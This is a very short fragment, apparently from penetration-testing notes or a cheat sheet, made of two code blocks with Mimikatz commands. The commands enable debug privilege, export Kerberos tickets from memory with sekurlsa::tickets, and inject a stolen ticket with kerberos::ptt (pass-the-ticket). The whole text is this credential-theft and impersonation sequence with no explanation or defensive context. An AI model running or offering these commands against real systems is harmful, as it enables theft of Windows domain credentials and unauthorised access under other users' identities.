```powershell
privilege::debug
sekurlsa::tickets /export
```

```powershell
kerberos::ptt $TICKET_FILE
```

